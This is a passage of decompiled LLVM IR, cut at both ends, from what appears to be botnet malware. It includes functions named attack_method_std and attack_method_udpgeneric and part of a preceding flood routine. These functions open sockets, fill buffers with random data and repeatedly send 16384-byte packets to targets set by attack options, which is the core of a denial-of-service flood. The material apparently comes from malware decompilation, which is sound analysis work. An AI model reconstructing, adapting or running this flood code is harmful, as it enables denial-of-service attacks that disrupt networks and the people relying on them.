  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8a58 = load i32, i32* @r4, align 4
  %v9_8a58 = icmp eq i32 %v3_8a50, %v1_8a58
  br i1 %v9_8a58, label %dec_label_pc_8a88, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8a70 = udiv i32 %v0_8a50, 16777216
  store i32 %v4_8a70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8a98

dec_label_pc_8a88:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8a88 = call i32 @rand_next()
  br label %dec_label_pc_8a98

dec_label_pc_8a98:                                ; preds = %bb, %dec_label_pc_8a88
  %v0_8a7c10 = urem i32 %v5_8a4c, 256
  %v0_8a98 = load i32, i32* @r7, align 4
  %v2_8a98 = icmp eq i32 %v0_8a98, 0
  br i1 %v2_8a98, label %dec_label_pc_8bd8, label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a98
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8b4c = udiv i32 %v3_8a00, 256
  %v1_8b48 = mul i32 %v5_89f8, 256
  %v4_8b50 = and i32 %v1_8b48, 65280
  %v5_8b50 = or i32 %v4_8b50, %v3_8b4c
  %v2_8ad0 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8b30

dec_label_pc_8ab0:                                ; preds = %bb51, %dec_label_pc_8b70
  %v3_8abc = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_8ac4 = icmp eq i32 %v3_8abc, -1
  %v0_8ac8 = load i32, i32* @sb, align 4
  %v1_8ac8 = add i32 %v0_8ac8, 1
  store i32 %v1_8ac8, i32* @sb, align 4
  %v0_8acc = load i32, i32* @fp, align 4
  %v1_8acc = add i32 %v0_8acc, 24
  store i32 %v1_8acc, i32* @fp, align 4
  %v2_8ad8 = load i32, i32* @r8, align 4
  %v3_8ad8 = add i32 %v2_8ad8, %stack_var_-60.0
  %v4_8ad8 = inttoptr i32 %v3_8ad8 to i32*
  store i32 %v3_8abc, i32* %v4_8ad8, align 4
  br i1 %v7_8ac4, label %dec_label_pc_8bcc, label %dec_label_pc_8ae0

dec_label_pc_8ae0:                                ; preds = %dec_label_pc_8ab0
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8af8 = call i32 @bind(i32 %v3_8abc, i32 %v2_8ad0, i32 16)
  %v0_8afc = load i32, i32* @r6, align 4
  %v1_8afc = add i32 %v0_8afc, 20
  %v2_8afc = inttoptr i32 %v1_8afc to i8*
  %v3_8afc = load i8, i8* %v2_8afc, align 1
  %v4_8afc = zext i8 %v3_8afc to i32
  store i32 %v4_8afc, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8afc, 32
  br i1 %tmp, label %dec_label_pc_8b84, label %dec_label_pc_8b08

dec_label_pc_8b08:                                ; preds = %dec_label_pc_8ae0, %dec_label_pc_8b84
  %v0_8b0c = phi i32 [ %v0_8afc, %dec_label_pc_8ae0 ], [ %v0_8b0c.pre, %dec_label_pc_8b84 ]
  %v1_8b10 = load i32, i32* @r8, align 4
  %v2_8b10 = add i32 %v1_8b10, %stack_var_-60.0
  %v3_8b10 = inttoptr i32 %v2_8b10 to i32*
  %v4_8b10 = load i32, i32* %v3_8b10, align 4
  %v3_8b18 = call i32 @__libc_connect(i32 %v4_8b10, i32 %v0_8b0c, i32 16)
  %v0_8b20 = load i32, i32* @sb, align 4
  %v1_8b20 = load i32, i32* @r7, align 4
  %v9_8b20 = icmp eq i32 %v0_8b20, %v1_8b20
  %v1_8b24 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8b24, i32* %r3.global-to-local, align 4
  br i1 %v9_8b20, label %dec_label_pc_8bd8, label %dec_label_pc_8b30

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8aa0
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8aa0 ], [ %v1_8b24, %dec_label_pc_8b08 ]
  store i32 65535, i32* @r4, align 4
  %v2_8b40 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8b50, i32* %r3.global-to-local, align 4
  %v1_8b5c = load i32, i32* @r4, align 4
  %v9_8b5c = icmp eq i32 %v3_8a00, %v1_8b5c
  %v1_8b60 = load i32, i32* @fp, align 4
  %v2_8b60 = add i32 %v1_8b60, %arg2
  store i32 %v2_8b60, i32* @r6, align 4
  %v2_8b64 = load i32, i32* @sl, align 4
  %v3_8b64 = add i32 %v2_8b64, %stack_var_-60.0
  %v4_8b64 = inttoptr i32 %v3_8b64 to i32*
  store i32 %v2_8b40, i32* %v4_8b64, align 4
  br i1 %v9_8b5c, label %dec_label_pc_8b70, label %bb51

bb51:                                             ; preds = %dec_label_pc_8b30
  %v1_8b68 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b68 = trunc i32 %v1_8b68 to i16
  %v3_8b68 = load i32, i32* @r6, align 4
  %v4_8b68 = add i32 %v3_8b68, 2
  %v5_8b68 = inttoptr i32 %v4_8b68 to i16*
  store i16 %v2_8b68, i16* %v5_8b68, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b70:                                ; preds = %dec_label_pc_8b30
  %v0_8b70 = call i32 @rand_next()
  %v1_8b70 = trunc i32 %v0_8b70 to i16
  %v0_8b78 = load i32, i32* @fp, align 4
  %v2_8b78 = add i32 %v0_8b78, %arg2
  store i32 %v2_8b78, i32* @r6, align 4
  %v4_8b7c = add i32 %v2_8b78, 2
  %v5_8b7c = inttoptr i32 %v4_8b7c to i16*
  store i16 %v1_8b70, i16* %v5_8b7c, align 2
  br label %dec_label_pc_8ab0

dec_label_pc_8b84:                                ; preds = %dec_label_pc_8ae0
  %v1_8b84 = add i32 %v0_8afc, 16
  %v2_8b84 = inttoptr i32 %v1_8b84 to i32*
  %v3_8b84 = load i32, i32* %v2_8b84, align 4
  store i32 %v3_8b84, i32* @r4, align 4
  %v0_8b88 = call i32 @rand_next()
  %v0_8b8c = load i32, i32* @r4, align 4
  %v1_8b98 = and i32 %v0_8b8c, 65280
  store i32 %v1_8b98, i32* %r3.global-to-local, align 4
  %v0_8ba0 = load i32, i32* @r6, align 4
  %v1_8ba0 = add i32 %v0_8ba0, 20
  %v2_8ba0 = inttoptr i32 %v1_8ba0 to i8*
  %v3_8ba0 = load i8, i8* %v2_8ba0, align 1
  %v4_8ba0 = zext i8 %v3_8ba0 to i32
  %v5_8ba4 = call i32 @llvm.bswap.i32(i32 %v0_8b8c)
  %v7_8ba8 = lshr i32 %v0_8b88, %v4_8ba0
  %v8_8ba8 = add i32 %v7_8ba8, %v5_8ba4
  %v5_8bc0 = call i32 @llvm.bswap.i32(i32 %v8_8ba8)
  store i32 %v5_8bc0, i32* %r3.global-to-local, align 4
  %v2_8bc4 = add i32 %v0_8ba0, 4
  %v3_8bc4 = inttoptr i32 %v2_8bc4 to i32*
  store i32 %v5_8bc0, i32* %v3_8bc4, align 4
  %v0_8b0c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8b08

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8ab0
  store i32 %v18_89ac, i32* %sb.global-to-local, align 4
  ret i32 %v3_8abc

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8b08, %dec_label_pc_8a98
  %v1_8c1822 = phi i32 [ 0, %dec_label_pc_8a98 ], [ %v0_8b20, %dec_label_pc_8b08 ]
  %v2_8bdc = icmp eq i32 %v0_8a7c10, 0
  br i1 %v2_8bdc, label %dec_label_pc_8bfc.outer, label %dec_label_pc_8c14

dec_label_pc_8bec:                                ; preds = %dec_label_pc_8bfc
  store i32 %v1_8bf0, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8bec = load i32, i32* @r8, align 4
  %v4_8bec = mul i32 %v1_8bf0, 4
  %v5_8bec = add i32 %v0_8bec, %v4_8bec
  %v6_8bec = inttoptr i32 %v5_8bec to i32*
  %v7_8bec = load i32, i32* %v6_8bec, align 4
  %v0_8bf0 = load i32, i32* @sl, align 4
  %v5_8bf0 = add i32 %v0_8bf0, %v4_8bec
  %v6_8bf0 = inttoptr i32 %v5_8bf0 to i32*
  %v7_8bf0 = load i32, i32* %v6_8bf0, align 4
  %v4_8bf4 = call i32 @__libc_send(i32 %v7_8bec, i32 %v7_8bf0, i32 %v0_8c00, i32 16384)
  %v0_8bf8 = load i32, i32* @r4, align 4
  %v1_8bf8 = add i32 %v0_8bf8, 1
  %v0_8bfc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bfc.outer

dec_label_pc_8bfc.outer:                          ; preds = %dec_label_pc_8bd8, %dec_label_pc_8bec
  %v0_8bfc.ph = phi i32 [ %v0_8bfc.pre.pre, %dec_label_pc_8bec ], [ %v1_8c1822, %dec_label_pc_8bd8 ]
  %v1_8bf0.ph = phi i32 [ %v1_8bf8, %dec_label_pc_8bec ], [ 0, %dec_label_pc_8bd8 ]
  %v0_8c00 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bfc

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bfc.outer, %dec_label_pc_8bfc
  %v1_8bf0 = phi i32 [ 0, %dec_label_pc_8bfc ], [ %v1_8bf0.ph, %dec_label_pc_8bfc.outer ]
  %v8_8c08 = icmp sgt i32 %v0_8bfc.ph, %v1_8bf0
  br i1 %v8_8c08, label %dec_label_pc_8bec, label %dec_label_pc_8bfc

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c18, %dec_label_pc_8bd8
  %v1_8c1821 = phi i32 [ %v1_8c1822, %dec_label_pc_8bd8 ], [ %v1_8c18, %dec_label_pc_8c18 ]
  br label %dec_label_pc_8c18

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8c24, %dec_label_pc_8c14
  %v1_8c18 = phi i32 [ %v1_8c1821, %dec_label_pc_8c14 ], [ %v1_8c18.pre, %dec_label_pc_8c24 ]
  %v1_8c24 = phi i32 [ 0, %dec_label_pc_8c14 ], [ %v1_8c44, %dec_label_pc_8c24 ]
  store i32 %v1_8c24, i32* @r6, align 4
  %v6_8c20 = icmp slt i32 %v1_8c24, %v1_8c18
  br i1 %v6_8c20, label %dec_label_pc_8c24, label %dec_label_pc_8c14

dec_label_pc_8c24:                                ; preds = %dec_label_pc_8c18
  %v0_8c1c = load i32, i32* @r5, align 4
  %v0_8c24 = load i32, i32* @sl, align 4
  %v4_8c24 = mul i32 %v1_8c24, 4
  %v5_8c24 = add i32 %v0_8c24, %v4_8c24
  %v6_8c24 = inttoptr i32 %v5_8c24 to i32*
  %v7_8c24 = load i32, i32* %v6_8c24, align 4
  store i32 %v7_8c24, i32* @r4, align 4
  %v2_8c2c = inttoptr i32 %v7_8c24 to i16*
  %v3_8c2c = call i32 @rand_str(i16* %v2_8c2c, i32 %v0_8c1c)
  %v0_8c30 = load i32, i32* @r8, align 4
  %v1_8c30 = load i32, i32* @r6, align 4
  %v4_8c30 = mul i32 %v1_8c30, 4
  %v5_8c30 = add i32 %v4_8c30, %v0_8c30
  %v6_8c30 = inttoptr i32 %v5_8c30 to i32*
  %v7_8c30 = load i32, i32* %v6_8c30, align 4
  %v0_8c34 = load i32, i32* @r4, align 4
  %v0_8c38 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8c40 = call i32 @__libc_send(i32 %v7_8c30, i32 %v0_8c34, i32 %v0_8c38, i32 16384)
  %v0_8c44 = load i32, i32* @r6, align 4
  %v1_8c44 = add i32 %v0_8c44, 1
  %v1_8c18.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8c18

; uselistorder directives
  uselistorder i32 %v1_8c18, { 1, 0 }
  uselistorder i32 %v1_8bf0, { 2, 1, 0 }
  uselistorder i32 %v5_8bc0, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8afc, { 1, 0, 2 }
  uselistorder i32 %v3_8abc, { 1, 2, 3, 0 }
  uselistorder i32 %v3_8a50, { 1, 0 }
  uselistorder i32 %v3_8a00, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8bfc.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8b08, { 1, 0 }
  uselistorder label %dec_label_pc_8ab0, { 1, 0 }
  uselistorder label %dec_label_pc_8a98, { 1, 0 }
}

define i32 @attack_method_std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_8c4c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8c68 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_8c68, i32* @sl, align 4
  %v0_8c74 = load i32, i32* @r7, align 4
  %v2_8c78 = call i32 @calloc(i32 %v0_8c74, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_8c84 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8c78, i32* @r8, align 4
  %v0_8c94 = load i32, i32* @r5, align 4
  %v4_8c98 = inttoptr i32 %v0_8c84 to i32*
  %v5_8c98 = call i32 @attack_get_opt_int(i32 %v0_8c94, i32* %v4_8c98, i32 7, i32 65535)
  %v3_8ca0 = urem i32 %v5_8c98, 65536
  %v0_8ca4 = load i32, i32* @r6, align 4
  %v0_8cac = load i32, i32* @r4, align 4
  store i32 %v0_8cac, i32* %r3.global-to-local, align 4
  %v0_8cb0 = load i32, i32* @r5, align 4
  %v5_8cb8 = inttoptr i32 %v0_8ca4 to i32*
  %v6_8cb8 = call i32 @attack_get_opt_int(i32 %v0_8cb0, i32* %v5_8cb8, i32 6, i32 %v0_8cac)
  %v0_8cbc = load i32, i32* @r6, align 4
  %v3_8cc0 = mul i32 %v6_8cb8, 65536
  store i32 %v3_8cc0, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_8ccc = load i32, i32* @r5, align 4
  %v4_8cd0 = inttoptr i32 %v0_8cbc to i32*
  %v5_8cd0 = call i32 @attack_get_opt_int(i32 %v0_8ccc, i32* %v4_8cd0, i32 0, i32 1024)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8ce0 = load i32, i32* @r6, align 4
  %v0_8ce4 = load i32, i32* @r5, align 4
  %v3_8ce8 = urem i32 %v5_8cd0, 65536
  store i32 %v3_8ce8, i32* @r5, align 4
  %v4_8cec = inttoptr i32 %v0_8ce0 to i32*
  %v5_8cec = call i32 @attack_get_opt_int(i32 %v0_8ce4, i32* %v4_8cec, i32 1, i32 1)
  %v0_8cf0 = load i32, i32* %sb.global-to-local, align 4
  %v3_8cf0 = udiv i32 %v0_8cf0, 65536
  store i32 %v3_8cf0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8cf8 = load i32, i32* @r4, align 4
  %v9_8cf8 = icmp eq i32 %v3_8cf0, %v1_8cf8
  br i1 %v9_8cf8, label %dec_label_pc_8d28, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8d10 = udiv i32 %v0_8cf0, 16777216
  store i32 %v4_8d10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8d38

dec_label_pc_8d28:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8d28 = call i32 @rand_next()
  br label %dec_label_pc_8d38

dec_label_pc_8d38:                                ; preds = %bb, %dec_label_pc_8d28
  %v0_8d1c10 = urem i32 %v5_8cec, 256
  %v0_8d38 = load i32, i32* @r7, align 4
  %v2_8d38 = icmp eq i32 %v0_8d38, 0
  br i1 %v2_8d38, label %dec_label_pc_8e78, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_8d38
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8dec = udiv i32 %v3_8ca0, 256
  %v1_8de8 = mul i32 %v5_8c98, 256
  %v4_8df0 = and i32 %v1_8de8, 65280
  %v5_8df0 = or i32 %v4_8df0, %v3_8dec
  %v2_8d70 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8dd0

dec_label_pc_8d50:                                ; preds = %bb51, %dec_label_pc_8e10
  %v3_8d5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v7_8d64 = icmp eq i32 %v3_8d5c, -1
  %v0_8d68 = load i32, i32* @sb, align 4
  %v1_8d68 = add i32 %v0_8d68, 1
  store i32 %v1_8d68, i32* @sb, align 4
  %v0_8d6c = load i32, i32* @fp, align 4
  %v1_8d6c = add i32 %v0_8d6c, 24
  store i32 %v1_8d6c, i32* @fp, align 4
  %v2_8d78 = load i32, i32* @r8, align 4
  %v3_8d78 = add i32 %v2_8d78, %stack_var_-60.0
  %v4_8d78 = inttoptr i32 %v3_8d78 to i32*
  store i32 %v3_8d5c, i32* %v4_8d78, align 4
  br i1 %v7_8d64, label %dec_label_pc_8e6c, label %dec_label_pc_8d80

dec_label_pc_8d80:                                ; preds = %dec_label_pc_8d50
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8d98 = call i32 @bind(i32 %v3_8d5c, i32 %v2_8d70, i32 16)
  %v0_8d9c = load i32, i32* @r6, align 4
  %v1_8d9c = add i32 %v0_8d9c, 20
  %v2_8d9c = inttoptr i32 %v1_8d9c to i8*
  %v3_8d9c = load i8, i8* %v2_8d9c, align 1
  %v4_8d9c = zext i8 %v3_8d9c to i32
  store i32 %v4_8d9c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8d9c, 32
  br i1 %tmp, label %dec_label_pc_8e24, label %dec_label_pc_8da8

dec_label_pc_8da8:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_8e24
  %v0_8dac = phi i32 [ %v0_8d9c, %dec_label_pc_8d80 ], [ %v0_8dac.pre, %dec_label_pc_8e24 ]
  %v1_8db0 = load i32, i32* @r8, align 4
  %v2_8db0 = add i32 %v1_8db0, %stack_var_-60.0
  %v3_8db0 = inttoptr i32 %v2_8db0 to i32*
  %v4_8db0 = load i32, i32* %v3_8db0, align 4
  %v3_8db8 = call i32 @__libc_connect(i32 %v4_8db0, i32 %v0_8dac, i32 16)
  %v0_8dc0 = load i32, i32* @sb, align 4
  %v1_8dc0 = load i32, i32* @r7, align 4
  %v9_8dc0 = icmp eq i32 %v0_8dc0, %v1_8dc0
  %v1_8dc4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8dc4, i32* %r3.global-to-local, align 4
  br i1 %v9_8dc0, label %dec_label_pc_8e78, label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d40
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d40 ], [ %v1_8dc4, %dec_label_pc_8da8 ]
  store i32 65535, i32* @r4, align 4
  %v2_8de0 = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_8df0, i32* %r3.global-to-local, align 4
  %v1_8dfc = load i32, i32* @r4, align 4
  %v9_8dfc = icmp eq i32 %v3_8ca0, %v1_8dfc
  %v1_8e00 = load i32, i32* @fp, align 4
  %v2_8e00 = add i32 %v1_8e00, %arg2
  store i32 %v2_8e00, i32* @r6, align 4
  %v2_8e04 = load i32, i32* @sl, align 4
  %v3_8e04 = add i32 %v2_8e04, %stack_var_-60.0
  %v4_8e04 = inttoptr i32 %v3_8e04 to i32*
  store i32 %v2_8de0, i32* %v4_8e04, align 4
  br i1 %v9_8dfc, label %dec_label_pc_8e10, label %bb51

bb51:                                             ; preds = %dec_label_pc_8dd0
  %v1_8e08 = load i32, i32* %r3.global-to-local, align 4
  %v2_8e08 = trunc i32 %v1_8e08 to i16
  %v3_8e08 = load i32, i32* @r6, align 4
  %v4_8e08 = add i32 %v3_8e08, 2
  %v5_8e08 = inttoptr i32 %v4_8e08 to i16*
  store i16 %v2_8e08, i16* %v5_8e08, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e10:                                ; preds = %dec_label_pc_8dd0
  %v0_8e10 = call i32 @rand_next()
  %v1_8e10 = trunc i32 %v0_8e10 to i16
  %v0_8e18 = load i32, i32* @fp, align 4
  %v2_8e18 = add i32 %v0_8e18, %arg2
  store i32 %v2_8e18, i32* @r6, align 4
  %v4_8e1c = add i32 %v2_8e18, 2
  %v5_8e1c = inttoptr i32 %v4_8e1c to i16*
  store i16 %v1_8e10, i16* %v5_8e1c, align 2
  br label %dec_label_pc_8d50

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8d80
  %v1_8e24 = add i32 %v0_8d9c, 16
  %v2_8e24 = inttoptr i32 %v1_8e24 to i32*
  %v3_8e24 = load i32, i32* %v2_8e24, align 4
  store i32 %v3_8e24, i32* @r4, align 4
  %v0_8e28 = call i32 @rand_next()
  %v0_8e2c = load i32, i32* @r4, align 4
  %v1_8e38 = and i32 %v0_8e2c, 65280
  store i32 %v1_8e38, i32* %r3.global-to-local, align 4
  %v0_8e40 = load i32, i32* @r6, align 4
  %v1_8e40 = add i32 %v0_8e40, 20
  %v2_8e40 = inttoptr i32 %v1_8e40 to i8*
  %v3_8e40 = load i8, i8* %v2_8e40, align 1
  %v4_8e40 = zext i8 %v3_8e40 to i32
  %v5_8e44 = call i32 @llvm.bswap.i32(i32 %v0_8e2c)
  %v7_8e48 = lshr i32 %v0_8e28, %v4_8e40
  %v8_8e48 = add i32 %v7_8e48, %v5_8e44
  %v5_8e60 = call i32 @llvm.bswap.i32(i32 %v8_8e48)
  store i32 %v5_8e60, i32* %r3.global-to-local, align 4
  %v2_8e64 = add i32 %v0_8e40, 4
  %v3_8e64 = inttoptr i32 %v2_8e64 to i32*
  store i32 %v5_8e60, i32* %v3_8e64, align 4
  %v0_8dac.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8da8

dec_label_pc_8e6c:                                ; preds = %dec_label_pc_8d50
  store i32 %v18_8c4c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8d5c

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8da8, %dec_label_pc_8d38
  %v1_8eb822 = phi i32 [ 0, %dec_label_pc_8d38 ], [ %v0_8dc0, %dec_label_pc_8da8 ]
  %v2_8e7c = icmp eq i32 %v0_8d1c10, 0
  br i1 %v2_8e7c, label %dec_label_pc_8e9c.outer, label %dec_label_pc_8eb4

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e9c
  store i32 %v1_8e90, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8e8c = load i32, i32* @r8, align 4
  %v4_8e8c = mul i32 %v1_8e90, 4
  %v5_8e8c = add i32 %v0_8e8c, %v4_8e8c
  %v6_8e8c = inttoptr i32 %v5_8e8c to i32*
  %v7_8e8c = load i32, i32* %v6_8e8c, align 4
  %v0_8e90 = load i32, i32* @sl, align 4
  %v5_8e90 = add i32 %v0_8e90, %v4_8e8c
  %v6_8e90 = inttoptr i32 %v5_8e90 to i32*
  %v7_8e90 = load i32, i32* %v6_8e90, align 4
  %v4_8e94 = call i32 @__libc_send(i32 %v7_8e8c, i32 %v7_8e90, i32 %v0_8ea0, i32 16384)
  %v0_8e98 = load i32, i32* @r4, align 4
  %v1_8e98 = add i32 %v0_8e98, 1
  %v0_8e9c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e9c.outer

dec_label_pc_8e9c.outer:                          ; preds = %dec_label_pc_8e78, %dec_label_pc_8e8c
  %v0_8e9c.ph = phi i32 [ %v0_8e9c.pre.pre, %dec_label_pc_8e8c ], [ %v1_8eb822, %dec_label_pc_8e78 ]
  %v1_8e90.ph = phi i32 [ %v1_8e98, %dec_label_pc_8e8c ], [ 0, %dec_label_pc_8e78 ]
  %v0_8ea0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8e9c

dec_label_pc_8e9c:                                ; preds = %dec_label_pc_8e9c.outer, %dec_label_pc_8e9c
  %v1_8e90 = phi i32 [ 0, %dec_label_pc_8e9c ], [ %v1_8e90.ph, %dec_label_pc_8e9c.outer ]
  %v8_8ea8 = icmp sgt i32 %v0_8e9c.ph, %v1_8e90
  br i1 %v8_8ea8, label %dec_label_pc_8e8c, label %dec_label_pc_8e9c

dec_label_pc_8eb4:                                ; preds = %dec_label_pc_8eb8, %dec_label_pc_8e78
  %v1_8eb821 = phi i32 [ %v1_8eb822, %dec_label_pc_8e78 ], [ %v1_8eb8, %dec_label_pc_8eb8 ]
  br label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8ec4, %dec_label_pc_8eb4
  %v1_8eb8 = phi i32 [ %v1_8eb821, %dec_label_pc_8eb4 ], [ %v1_8eb8.pre, %dec_label_pc_8ec4 ]
  %v1_8ec4 = phi i32 [ 0, %dec_label_pc_8eb4 ], [ %v1_8ee4, %dec_label_pc_8ec4 ]
  store i32 %v1_8ec4, i32* @r6, align 4
  %v6_8ec0 = icmp slt i32 %v1_8ec4, %v1_8eb8
  br i1 %v6_8ec0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb4

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8eb8
  %v0_8ebc = load i32, i32* @r5, align 4
  %v0_8ec4 = load i32, i32* @sl, align 4
  %v4_8ec4 = mul i32 %v1_8ec4, 4
  %v5_8ec4 = add i32 %v0_8ec4, %v4_8ec4
  %v6_8ec4 = inttoptr i32 %v5_8ec4 to i32*
  %v7_8ec4 = load i32, i32* %v6_8ec4, align 4
  store i32 %v7_8ec4, i32* @r4, align 4
  %v2_8ecc = inttoptr i32 %v7_8ec4 to i16*
  %v3_8ecc = call i32 @rand_str(i16* %v2_8ecc, i32 %v0_8ebc)
  %v0_8ed0 = load i32, i32* @r8, align 4
  %v1_8ed0 = load i32, i32* @r6, align 4
  %v4_8ed0 = mul i32 %v1_8ed0, 4
  %v5_8ed0 = add i32 %v4_8ed0, %v0_8ed0
  %v6_8ed0 = inttoptr i32 %v5_8ed0 to i32*
  %v7_8ed0 = load i32, i32* %v6_8ed0, align 4
  %v0_8ed4 = load i32, i32* @r4, align 4
  %v0_8ed8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8ee0 = call i32 @__libc_send(i32 %v7_8ed0, i32 %v0_8ed4, i32 %v0_8ed8, i32 16384)
  %v0_8ee4 = load i32, i32* @r6, align 4
  %v1_8ee4 = add i32 %v0_8ee4, 1
  %v1_8eb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8eb8

; uselistorder directives
  uselistorder i32 %v1_8eb8, { 1, 0 }
  uselistorder i32 %v1_8e90, { 2, 1, 0 }
  uselistorder i32 %v5_8e60, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8d9c, { 1, 0, 2 }
  uselistorder i32 %v3_8d5c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_8cf0, { 1, 0 }
  uselistorder i32 %v3_8ca0, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c, { 1, 0 }
  uselistorder label %dec_label_pc_8e9c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8da8, { 1, 0 }
  uselistorder label %dec_label_pc_8d50, { 1, 0 }
  uselistorder label %dec_label_pc_8d38, { 1, 0 }
}

define i32 @attack_method_udpgeneric(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_8eec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8f08 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_8f0c = load i32, i32* @r5, align 4
  store i32 %v0_8f0c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f1c = load i32, i32* @r4, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v5_8f20 = inttoptr i32 %v0_8f0c to i32*
  %v6_8f20 = call i32 @attack_get_opt_int(i32 %v0_8f1c, i32* %v5_8f20, i32 2, i32 0)
  %v1_8f2c = urem i32 %v6_8f20, 256
